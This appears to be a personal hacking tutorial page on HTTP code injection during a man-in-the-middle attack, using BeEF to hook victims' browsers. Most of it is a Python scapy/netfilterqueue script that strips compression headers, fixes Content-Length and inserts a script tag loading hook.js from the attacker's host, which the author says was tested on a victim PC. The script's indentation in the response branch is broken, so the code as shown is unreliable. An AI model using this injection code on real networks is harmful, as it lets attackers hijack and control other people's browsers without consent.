---
title: "HTTP code injection & BeEF"
date: 2019-01-09
# geekdocFlatSection: false
# geekdocToc: 6
# geekdocHidden: false
---

After we become the [mitm][arp_cache_poisoning] we can modify HTTP responses by changing the Raw data on the fly.  
[arp_cache_poisoning]: https://jellepelle.github.io/doc_the_hacks/arp/arp_cache_poisoning/

Since most clients will request [content encoding][http_compression] (by adding a "Accept-Encoding" header), the HTTP response data (scapy.Raw layer) will look like gibberish.  
This is is because the data is GZIPPED most of the time. To get around this we can simply delete this header from the HTTP request!  
[http_compression]: https://en.wikipedia.org/wiki/HTTP_compression

We also need to make sure we change the size of the "Content-Length" value to match with our injected code.   
Otherwise the client browser will not accept the server response.  

In the below example code we then use BeEF on our attacker machine. BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. The key to success with BeEF is to "hook" a browser. This basically means that we need the victim to visit a vulnerable web app (or as shown in the below code example just by browsing to a HTTP website that has a particular string in the body text). This injected code in the "hooked" browser then responds to commands from the BeEF server. From there, we can do a number of malicious things on the victim's computer.  

On Parrot OS i first opened BeEF Framework and then logged in with the default credentials for BeEF: beef/beef at:
http://localhost:3000/ui/authentication

![beef](beef.jpg)

In the below example we are modifying HTTP responses and injecting the BeEF Hook javascript code into it. Evil stuff :-P  

I successfully tested all this on a Windows 10 victim PC with Chrome browser by visiting a HTML site that had a particular string in the body and replacing this with injected code.

I then verified the browser was hooked in BeEF on my attacker machine. Then i succesfully send a JS alert via BeEF (commands > browser > hooked domain > create alert dialog). 

```python

# !/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)

        elif scapy_packet[scapy.TCP].sport == 80:
          print("[+] Response")
                print(scapy_packet.show())
                injection_code = '<script src="http://192.168.178.18:3000/hook.js"></script>'
                load = scapy_packet[scapy.Raw].load.replace('<meta property="og:title" content="Home"/>', injection_code)
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```
